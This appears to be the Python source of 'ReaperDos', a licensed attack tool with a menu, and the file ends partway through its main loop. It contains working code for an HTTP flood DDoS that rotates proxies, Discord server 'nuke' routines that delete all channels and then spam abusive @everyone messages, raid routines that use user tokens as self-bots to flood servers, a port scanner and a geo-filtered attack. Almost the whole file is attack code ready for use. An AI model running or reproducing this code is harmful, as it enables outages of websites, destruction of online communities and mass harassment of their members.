import requests
import uuid
import platform
import hashlib
import re
import time
import os
import logging
import threading
import random
import socket
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from scapy.all import *
from colorama import init, Fore, Style
from datetime import datetime
import json
import csv
import discord
from discord.ext import commands

# Initialize colorama for colored output
init()

# Configure logging
os.makedirs('logs', exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/reaperdos.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ReaperDos configuration
RENDER_URL = 'https://slibidybababab.onrender.com'
TIMEOUT = 5
GEOIP_API_URL = 'https://ipapi.co/{}/json/'  # Web API for IP geolocation
PROXY_FILE = 'Free_Proxy_List.txt'

# Set terminal title to "ReaperDos" based on platform
if os.name == 'nt':  # Windows
    os.system('title ReaperDos')
else:  # Unix-like (e.g., Linux, macOS)
    print("\033]0;ReaperDos\007", end='')

# Display program name and enhanced ASCII art
print(f"{Fore.RED}ReaperDos{Style.RESET_ALL}")
print(f"""
██████╗  ██████╗  ██████╗ ███████╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██║   ██║███████╗█████╗  
██╔══██╗██║   ██║██║   ██║╚════██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝███████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
    ReaperDos v1.0
       ______
   .-        -.
  /            \\
 |,  .-.  .-.  ,|
 | )(_o/  \\o_)( |
 |/     /\     \\|
 (_     ^^     _)
  \\__|IIIIII|__/
   | \\IIIIII/ |
   \\          /
    `--------`
""")

# Proxy management
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxies = []
        self.valid_proxies = []
        self.proxy_file = proxy_file
        self.load_proxies()
        asyncio.run(self.validate_proxies())

    def load_proxies(self):
        """Load proxies from Free_Proxy_List.txt"""
        try:
            with open(self.proxy_file, 'r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ip, port, protocol = row['ip'], row['port'], row['protocols']
                    proxy = f"{protocol}://{ip}:{port}"
                    self.proxies.append({
                        'proxy': proxy,
                        'ip': ip,
                        'port': port,
                        'protocol': protocol,
                        'latency': float(row['latency']),
                        'uptime': float(row['uptime'])
                    })
            logger.info(f"Loaded {len(self.proxies)} proxies from {self.proxy_file}")
        except Exception as e:
            logger.error(f"Failed to load proxies: {str(e)}")
            self.proxies = []

    async def validate_proxy(self, proxy):
        """Validate a single proxy by testing connectivity"""
        try:
            connector = ProxyConnector.from_url(proxy['proxy'])
            async with aiohttp.ClientSession(connector=connector) as session:
                start_time = time.time()
                async with session.get('http://example.com', timeout=TIMEOUT) as response:
                    latency = (time.time() - start_time) * 1000
                    if response.status == 200:
                        proxy['latency'] = latency
                        return proxy
        except Exception:
            return None
        return None

    async def validate_proxies(self):
        """Validate all proxies and filter valid ones"""
        tasks = [self.validate_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        self.valid_proxies = [r for r in results if r is not None]
        logger.info(f"Validated {len(self.valid_proxies)}/{len(self.proxies)} proxies")
        if not self.valid_proxies:
            logger.error("No valid proxies available. Using direct connection.")
            self.valid_proxies = [{'proxy': None, 'ip': None, 'port': None, 'protocol': None, 'latency': 0, 'uptime': 100}]

    def get_proxy(self):
        """Get a random valid proxy, prioritizing low latency and high uptime"""
        if not self.valid_proxies:
            return None
        weights = [proxy['uptime'] / (proxy['latency'] + 1) for proxy in self.valid_proxies]
        return random.choices(self.valid_proxies, weights=weights, k=1)[0]['proxy']

def generate_hwid():
    """Generate a unique HWID based on system info"""
    system_info = f"{platform.node()}-{platform.system()}-{platform.processor()}-{uuid.getnode()}"
    return hashlib.sha256(system_info.encode()).hexdigest()[:32]

def verify_license_key(key, hwid):
    """Verify key and bind HWID via Render endpoint"""
    try:
        response = requests.post(
            f'{RENDER_URL}/bot/verifykey',
            json={'key': key, 'hwid': hwid},
            headers={'Content-Type': 'application/json'},
            timeout=TIMEOUT
        )
        response.raise_for_status()
        data = response.json()
        if data.get('status') == 'success':
            logger.info(f"License verification: {data.get('message')}")
            return True
        else:
            logger.error(f"License verification failed: {data.get('error')}")
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Error verifying key: {str(e)}")
        return False

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    """Display side-by-side command menu"""
    print(f"{Fore.RED}═{'═' * 40} ReaperDos Menu {'═' * 40}{Style.RESET_ALL}")
    menu = [
        (" 1. Single DDoS Attack    ", "10. Single Raider Attack  "),
        (" 2. Multi DDoS Attack     ", "11. Multi Raider Attack   "),
        (" 3. Custom DDoS Attack    ", "12. Custom Raider Attack  "),
        (" 4. Single Nuke Attack    ", "13. IP Lookup            "),
        (" 5. Multi Nuke Attack     ", "14. Port Scan            "),
        (" 6. Custom Nuke Attack    ", "15. Proxy Speed Test     "),
        (" 7. Geo Filter Attack     ", "16. Packet Analysis      "),
        (" 8. Config Attack         ", "17. View Logs            "),
        (" 9. Exit                  ", "")
    ]
    for left, right in menu:
        print(f"{Fore.YELLOW}{left:<25} {right:<25}{Style.RESET_ALL}")
    print(f"{Fore.RED}═{'═' * 94}{Style.RESET_ALL}")

async def async_http_request(session, url, proxy, method='GET', headers=None, data=None):
    """Perform async HTTP request with proxy"""
    try:
        connector = ProxyConnector.from_url(proxy) if proxy else None
        async with session.request(method, url, proxy=proxy, headers=headers, data=data, timeout=TIMEOUT, connector=connector) as response:
            logger.info(f"HTTP {method} to {url} via {proxy or 'direct'}: {response.status}")
            return response.status
    except Exception as e:
        logger.error(f"HTTP request failed: {str(e)}")
        return None

async def ddos_attack(proxy_manager, target, duration, attack_type="single", threads=10, rate=100):
    """Perform HTTP flood DDoS attack"""
    stop_event = threading.Event()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    print(f"{Fore.YELLOW}Starting {attack_type} DDoS attack on {target} for {duration}s (Rate: {rate}/s, Threads: {threads}). Press Enter to stop.{Style.RESET_ALL}")
    
    async def send_requests():
        async with aiohttp.ClientSession() as session:
            while not stop_event.is_set():
                tasks = []
                for _ in range(threads):
                    proxy = proxy_manager.get_proxy()
                    payload = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100))} if attack_type == 'custom' else None
                    tasks.append(async_http_request(session, target, proxy, method='POST' if payload else 'GET', headers=headers, data=payload))
                await asyncio.gather(*tasks)
                await asyncio.sleep(1.0 / rate)
    
    def stop_on_enter():
        input()
        stop_event.set()
    
    threading.Thread(target=stop_on_enter, daemon=True).start()
    start_time = time.time()
    await send_requests()
    logger.info(f"DDoS attack {attack_type} on {target} completed or stopped after {time.time() - start_time:.2f}s")

async def multi_ddos_attack(proxy_manager, targets, duration, threads=10, rate=100):
    """Perform DDoS attack on multiple targets"""
    stop_event = threading.Event()
    print(f"{Fore.YELLOW}Starting multi DDoS attack on {len(targets)} targets for {duration}s. Press Enter to stop.{Style.RESET_ALL}")
    
    async def send_requests(target):
        async with aiohttp.ClientSession() as session:
            headers = {'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X)'])}
            while not stop_event.is_set():
                proxy = proxy_manager.get_proxy()
                await async_http_request(session, target, proxy, headers=headers)
                await asyncio.sleep(1.0 / rate)
    
    def stop_on_enter():
        input()
        stop_event.set()
    
    threading.Thread(target=stop_on_enter, daemon=True).start()
    start_time = time.time()
    tasks = [send_requests(target) for target in targets]
    await asyncio.gather(*tasks)
    logger.info(f"Multi DDoS attack on {len(targets)} targets completed or stopped after {time.time() - start_time:.2f}s")

async def nuke_attack(proxy_manager, token, server_id, duration):
    """Perform Discord server nuke with one bot token"""
    stop_event = threading.Event()
    client = commands.Bot(command_prefix='!', intents=discord.Intents.all())
    
    @client.event
    async def on_ready():
        print(f"{Fore.YELLOW}Setting up single nuke attack on server {server_id}...{Style.RESET_ALL}")
        try:
            guild = client.get_guild(int(server_id))
            if not guild:
                logger.error(f"Bot not in server {server_id}")
                print(f"{Fore.RED}Bot not in server. Ensure bot is invited.{Style.RESET_ALL}")
                await client.close()
                return
            
            # Delete all channels, categories, and voice channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    logger.info(f"Deleted channel {channel.name}")
                except Exception as e:
                    logger.error(f"Failed to delete channel {channel.name}: {str(e)}")
            
            # Change server name
            try:
                await guild.edit(name="/july x Reaper")
                logger.info("Changed server name to /july x Reaper")
            except Exception as e:
                logger.error(f"Failed to change server name: {str(e)}")
            
            print(f"{Fore.YELLOW}Type $reaper in any channel to start the nuke{Style.RESET_ALL}")
        
        except Exception as e:
            logger.error(f"Nuke setup failed: {str(e)}")
            print(f"{Fore.RED}Nuke setup failed: {str(e)}{Style.RESET_ALL}")
            await client.close()
    
    @client.command()
    async def reaper(ctx):
        guild = ctx.guild
        message = """@everyone Fucked by ReaperDos x discord.gg/july
        ⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
        ⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
        ⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
        ⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
        ⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
        ⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
        ⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
        ⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
        ⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
        ⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
        ⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
        ⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
        ⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
        ⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊"""
        
        print(f"{Fore.YELLOW}Nuke started on server {guild.id} by $reaper command{Style.RESET_ALL}")
        async def create_and_spam():
            while not stop_event.is_set():
                try:
                    new_channel = await guild.create_text_channel(f"reaperdos-{random.randint(1, 1000)}")
                    logger.info(f"Created channel {new_channel.name}")
                    for _ in range(15):
                        await new_channel.send(message)
                        logger.info(f"Sent message in {new_channel.name}")
                        await asyncio.sleep(0.5)
                    await asyncio.sleep(1)
                except Exception as e:
                    logger.error(f"Failed to create/spam channel: {str(e)}")
        
        client.loop.create_task(create_and_spam())
    
    def stop_on_enter():
        input()
        stop_event.set()
    
    threading.Thread(target=stop_on_enter, daemon=True).start()
    try:
        await client.start(token)
    except Exception as e:
        logger.error(f"Failed to start bot: {str(e)}")
        print(f"{Fore.RED}Failed to start bot: {str(e)}{Style.RESET_ALL}")

async def multi_nuke_attack(proxy_manager, tokens, server_id, duration):
    """Perform Discord server nuke with multiple bot tokens"""
    stop_event = threading.Event()
    print(f"{Fore.YELLOW}Setting up multi nuke attack on server {server_id} with {len(tokens)} bots...{Style.RESET_ALL}")
    
    async def nuke_with_token(token):
        client = commands.Bot(command_prefix='!', intents=discord.Intents.all())
        
        @client.event
        async def on_ready():
            try:
                guild = client.get_guild(int(server_id))
                if not guild:
                    logger.error(f"Bot not in server {server_id}")
                    print(f"{Fore.RED}Bot not in server. Ensure bot is invited.{Style.RESET_ALL}")
                    await client.close()
                    return
                
                # Delete all channels, categories, and voice channels
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        logger.info(f"Deleted channel {channel.name}")
                    except Exception as e:
                        logger.error(f"Failed to delete channel {channel.name}: {str(e)}")
                
                # Change server name
                try:
                    await guild.edit(name="/july x Reaper")
                    logger.info("Changed server name to /july x Reaper")
                except Exception as e:
                    logger.error(f"Failed to change server name: {str(e)}")
                
                print(f"{Fore.YELLOW}Type $reaper in any channel to start the nuke for bot {client.user}{Style.RESET_ALL}")
            
            except Exception as e:
                logger.error(f"Nuke setup failed: {str(e)}")
                print(f"{Fore.RED}Nuke setup failed: {str(e)}{Style.RESET_ALL}")
                await client.close()
        
        @client.command()
        async def reaper(ctx):
            guild = ctx.guild
            message = """@everyone Fucked by ReaperDos x discord.gg/july
            ⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
            ⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
            ⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
            ⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
            ⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
            ⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
            ⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
            ⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
            ⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
            ⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
            ⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
            ⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
            ⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
            ⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊"""
            
            print(f"{Fore.YELLOW}Nuke started on server {guild.id} by $reaper command for bot {client.user}{Style.RESET_ALL}")
            async def create_and_spam():
                while not stop_event.is_set():
                    try:
                        new_channel = await guild.create_text_channel(f"reaperdos-{random.randint(1, 1000)}")
                        logger.info(f"Created channel {new_channel.name}")
                        for _ in range(15):
                            await new_channel.send(message)
                            logger.info(f"Sent message in {new_channel.name}")
                            await asyncio.sleep(0.5)
                        await asyncio.sleep(1)
                    except Exception as e:
                        logger.error(f"Failed to create/spam channel: {str(e)}")
            
            client.loop.create_task(create_and_spam())
        
        try:
            await client.start(token)
        except Exception as e:
            logger.error(f"Failed to start bot: {str(e)}")
            print(f"{Fore.RED}Failed to start bot: {str(e)}{Style.RESET_ALL}")
    
    def stop_on_enter():
        input()
        stop_event.set()
    
    threading.Thread(target=stop_on_enter, daemon=True).start()
    tasks = [nuke_with_token(token) for token in tokens]
    await asyncio.gather(*tasks)
    logger.info(f"Multi nuke attack on server {server_id} completed or stopped")

async def custom_nuke_attack(proxy_manager, token, server_id, duration, server_name, channel_name, message):
    """Perform custom Discord server nuke with one bot token"""
    stop_event = threading.Event()
    client = commands.Bot(command_prefix='!', intents=discord.Intents.all())
    
    @client.event
    async def on_ready():
        print(f"{Fore.YELLOW}Setting up custom nuke attack on server {server_id}...{Style.RESET_ALL}")
        try:
            guild = client.get_guild(int(server_id))
            if not guild:
                logger.error(f"Bot not in server {server_id}")
                print(f"{Fore.RED}Bot not in server. Ensure bot is invited.{Style.RESET_ALL}")
                await client.close()
                return
            
            # Delete all channels, categories, and voice channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    logger.info(f"Deleted channel {channel.name}")
                except Exception as e:
                    logger.error(f"Failed to delete channel {channel.name}: {str(e)}")
            
            # Change server name
            try:
                await guild.edit(name=server_name)
                logger.info(f"Changed server name to {server_name}")
            except Exception as e:
                logger.error(f"Failed to change server name: {str(e)}")
            
            print(f"{Fore.YELLOW}Type $reaper in any channel to start the nuke{Style.RESET_ALL}")
        
        except Exception as e:
            logger.error(f"Custom nuke setup failed: {str(e)}")
            print(f"{Fore.RED}Custom nuke setup failed: {str(e)}{Style.RESET_ALL}")
            await client.close()
    
    @client.command()
    async def reaper(ctx):
        guild = ctx.guild
        print(f"{Fore.YELLOW}Nuke started on server {guild.id} by $reaper command{Style.RESET_ALL}")
        async def create_and_spam():
            while not stop_event.is_set():
                try:
                    new_channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1, 1000)}")
                    logger.info(f"Created channel {new_channel.name}")
                    for _ in range(15):
                        await new_channel.send(message)
                        logger.info(f"Sent message in {new_channel.name}")
                        await asyncio.sleep(0.5)
                    await asyncio.sleep(1)
                except Exception as e:
                    logger.error(f"Failed to create/spam channel: {str(e)}")
        
        client.loop.create_task(create_and_spam())
    
    def stop_on_enter():
        input()
        stop_event.set()
    
    threading.Thread(target=stop_on_enter, daemon=True).start()
    try:
        await client.start(token)
    except Exception as e:
        logger.error(f"Failed to start bot: {str(e)}")
        print(f"{Fore.RED}Failed to start bot: {str(e)}{Style.RESET_ALL}")

async def raider_attack(proxy_manager, token, invite_link):
    """Perform Discord server raid with user token"""
    client = discord.Client(intents=discord.Intents.all())
    
    @client.event
    async def on_ready():
        print(f"{Fore.YELLOW}Starting raid attack with user {client.user}...{Style.RESET_ALL}")
        try:
            invite = await client.fetch_invite(invite_link)
            guild = invite.guild
            await invite.accept()
            logger.info(f"Joined server {guild.name}")
            
            message = """@everyone @here discord.gg/july
            𒈙
            𒐫
            ﷽ 𒈙
            𒐫
            ﷽ 𒈙
            𒐫 𒈙
            𒐫 𒈙
            𒐫
            ﷽
            ﷽ 𒈙
            𒐫
            ﷽"""
            
            for channel in guild.text_channels:
                try:
                    for _ in range(10):
                        await channel.send(message)
                        logger.info(f"Sent message in {channel.name}")
                        await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"Failed to send message in {channel.name}: {str(e)}")
            await client.close()
        except Exception as e:
            logger.error(f"Raid attack failed: {str(e)}")
            print(f"{Fore.RED}Raid attack failed: {str(e)}{Style.RESET_ALL}")
            await client.close()
    
    try:
        await client.start(token)
    except Exception as e:
        logger.error(f"Failed to start self-bot: {str(e)}")
        print(f"{Fore.RED}Failed to start self-bot: {str(e)}{Style.RESET_ALL}")

async def multi_raider_attack(proxy_manager, tokens, invite_link):
    """Perform Discord server raid with multiple user tokens"""
    print(f"{Fore.YELLOW}Starting multi raid attack with {len(tokens)} users...{Style.RESET_ALL}")
    
    async def raid_with_token(token):
        client = discord.Client(intents=discord.Intents.all())
        
        @client.event
        async def on_ready():
            try:
                invite = await client.fetch_invite(invite_link)
                guild = invite.guild
                await invite.accept()
                logger.info(f"User {client.user} joined server {guild.name}")
                
                message = """@everyone @here discord.gg/july
                𒈙
                𒐫
                ﷽ 𒈙
                𒐫
                ﷽ 𒈙
                𒐫 𒈙
                𒐫 𒈙
                𒐫
                ﷽
                ﷽ 𒈙
                𒐫
                ﷽"""
                
                for channel in guild.text_channels:
                    try:
                        for _ in range(10):
                            await channel.send(message)
                            logger.info(f"User {client.user} sent message in {channel.name}")
                            await asyncio.sleep(0.5)
                    except Exception as e:
                        logger.error(f"Failed to send message in {channel.name}: {str(e)}")
                await client.close()
            except Exception as e:
                logger.error(f"Raid attack failed: {str(e)}")
                print(f"{Fore.RED}Raid attack failed: {str(e)}{Style.RESET_ALL}")
                await client.close()
        
        try:
            await client.start(token)
        except Exception as e:
            logger.error(f"Failed to start self-bot: {str(e)}")
            print(f"{Fore.RED}Failed to start self-bot: {str(e)}{Style.RESET_ALL}")
    
    tasks = [raid_with_token(token) for token in tokens]
    await asyncio.gather(*tasks)
    logger.info(f"Multi raid attack completed")

async def custom_raider_attack(proxy_manager, token, invite_link, message):
    """Perform custom Discord server raid with user token"""
    client = discord.Client(intents=discord.Intents.all())
    
    @client.event
    async def on_ready():
        print(f"{Fore.YELLOW}Starting custom raid attack with user {client.user}...{Style.RESET_ALL}")
        try:
            invite = await client.fetch_invite(invite_link)
            guild = invite.guild
            await invite.accept()
            logger.info(f"Joined server {guild.name}")
            
            for channel in guild.text_channels:
                try:
                    for _ in range(10):
                        await channel.send(message)
                        logger.info(f"Sent message in {channel.name}")
                        await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"Failed to send message in {channel.name}: {str(e)}")
            await client.close()
        except Exception as e:
            logger.error(f"Custom raid attack failed: {str(e)}")
            print(f"{Fore.RED}Custom raid attack failed: {str(e)}{Style.RESET_ALL}")
            await client.close()
    
    try:
        await client.start(token)
    except Exception as e:
        logger.error(f"Failed to start self-bot: {str(e)}")
        print(f"{Fore.RED}Failed to start self-bot: {str(e)}{Style.RESET_ALL}")

def ip_lookup(ip):
    """Perform IP geolocation lookup using ipapi.co API"""
    try:
        response = requests.get(GEOIP_API_URL.format(ip), timeout=TIMEOUT)
        response.raise_for_status()
        data = response.json()
        if data.get('error'):
            return {'ip': ip, 'error': data['reason']}
        return {
            'ip': ip,
            'country': data.get('country_name'),
            'iso_code': data.get('country_code')
        }
    except requests.exceptions.RequestException as e:
        logger.error(f"IP lookup failed: {str(e)}")
        return {'ip': ip, 'error': str(e)}

def port_scan(target, ports=(80, 443, 22, 21, 3389)):
    """Perform TCP connect port scan"""
    open_ports = []
    print(f"{Fore.YELLOW}Scanning ports on {target}...{Style.RESET_ALL}")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            logger.error(f"Port scan failed for {target}:{port}: {str(e)}")
    result = {'target': target, 'open_ports': open_ports}
    logger.info(f"Port scan on {target}: {result}")
    return result

async def proxy_speed_test(proxy_manager):
    """Test proxy latency"""
    results = []
    print(f"{Fore.YELLOW}Testing {len(proxy_manager.valid_proxies)} proxies...{Style.RESET_ALL}")
    async with aiohttp.ClientSession() as session:
        for proxy in proxy_manager.valid_proxies:
            start_time = time.time()
            try:
                connector = ProxyConnector.from_url(proxy['proxy']) if proxy['proxy'] else None
                async with session.get('http://example.com', proxy=proxy['proxy'], timeout=5, connector=connector) as response:
                    latency = (time.time() - start_time) * 1000
                    results.append({'proxy': proxy['proxy'], 'latency_ms': latency, 'status': response.status})
            except Exception as e:
                results.append({'proxy': proxy['proxy'], 'latency_ms': None, 'status': str(e)})
    logger.info(f"Proxy speed test completed: {len(results)} proxies tested")
    return results

def geo_filter_attack(proxy_manager, target, country_code, duration):
    """Perform geo-filtered attack using web API"""
    try:
        geo_data = ip_lookup(target)
        if 'error' in geo_data:
            print(f"{Fore.RED}Geo filter failed: {geo_data['error']}{Style.RESET_ALL}")
            return
        if geo_data.get('iso_code', '').upper() == country_code.upper():
            print(f"{Fore.YELLOW}Starting geo-filtered attack on {target} (Country: {geo_data['country']}) for {duration}s...{Style.RESET_ALL}")
            asyncio.run(ddos_attack(proxy_manager, target, duration, attack_type="geo"))
        else:
            print(f"{Fore.RED}Target {target} is not in {country_code}{Style.RESET_ALL}")
    except Exception as e:
        logger.error(f"Geo filter attack failed: {str(e)}")
        print(f"{Fore.RED}Geo filter attack failed: {str(e)}{Style.RESET_ALL}")

def config_attack(proxy_manager, config_file):
    """Configure attack from JSON file"""
    try:
        with open(config_file, 'r') as f:
            config = json.load(f)
        target = config.get('target')
        duration = config.get('duration', 60)
        attack_type = config.get('attack_type', 'ddos')
        print(f"{Fore.YELLOW}Starting {attack_type} attack from config on {target} for {duration}s...{Style.RESET_ALL}")
        if attack_type == 'ddos':
            asyncio.run(ddos_attack(proxy_manager, target, duration, threads=config.get('threads', 10)))
        elif attack_type == 'nuke':
            asyncio.run(nuke_attack(proxy_manager, config.get('token'), config.get('server_id'), duration))
        elif attack_type == 'raider':
            asyncio.run(raider_attack(proxy_manager, config.get('token'), config.get('invite_link')))
        logger.info(f"Config attack from {config_file} completed")
    except Exception as e:
        logger.error(f"Config attack failed: {str(e)}")
        print(f"{Fore.RED}Config attack failed: {str(e)}{Style.RESET_ALL}")

def view_logs():
    """View attack logs"""
    print(f"{Fore.YELLOW}Reading logs from logs/reaperdos.log{Style.RESET_ALL}")
    try:
        with open('logs/reaperdos.log', 'r') as f:
            logs = f.read()
        print(logs)
    except FileNotFoundError:
        print(f"{Fore.RED}No logs found{Style.RESET_ALL}")
    logger.info("Logs viewed")

def packet_analysis(interface, count):
    """Perform packet analysis using scapy"""
    try:
        print(f"{Fore.YELLOW}Starting packet capture on {interface} for {count} packets...{Style.RESET_ALL}")
        packets = sniff(iface=interface, count=count, timeout=TIMEOUT)
        summary = [pkt.summary() for pkt in packets]
        result = {'interface': interface, 'captured': len(packets), 'summary': summary}
        logger.info(f"Packet analysis on {interface}: {result}")
        return result
    except Exception as e:
        logger.error(f"Packet analysis failed: {str(e)}")
        return {'interface': interface, 'error': str(e)}

async def main():
    """Main ReaperDos function"""
    proxy_manager = ProxyManager(PROXY_FILE)
    await proxy_manager.validate_proxies()
    
    hwid = generate_hwid()
    print(f"{Fore.YELLOW}HWID: {hwid}{Style.RESET_ALL}")
    
    # License key verification loop
    while True:
        print(f"{Fore.RED}Enter your ReaperDos license key (xxxx-xxxx-xxxx-xxxx):{Style.RESET_ALL}")
        key = input().strip()
        if not re.match(r'^[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}$', key):
            print(f"{Fore.RED}Invalid key format. Use xxxx-xxxx-xxxx-xxxx{Style.RESET_ALL}")
            continue
        
        if verify_license_key(key, hwid):
            break
        print(f"{Fore.RED}License verification failed. Please try again or contact support.{Style.RESET_ALL}")
    
    # Main menu loop
    while True:
        clear_screen()
        display_menu()
        choice = input(f"{Fore.GREEN}Enter your choice (1-17): {Style.RESET_ALL}").strip()
        
        if choice == '1':  # Single DDoS Attack
            target = input(f"{Fore.GREEN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            await ddos_attack(proxy_manager, target, duration)
        
        elif choice == '2':  # Multi DDoS Attack
            targets = input(f"{Fore.GREEN}Enter target URLs (comma-separated, e.g., http://example.com,http://example.org): {Style.RESET_ALL}").split(',')
            duration = int(input(f"{Fore.GREEN}Enter duration in seconds: {Style.RESET_ALL}"))
            await multi_ddos_attack(proxy_manager, [t.strip() for t in targets], duration)
        
        elif choice == '3':  # Custom DDoS Attack
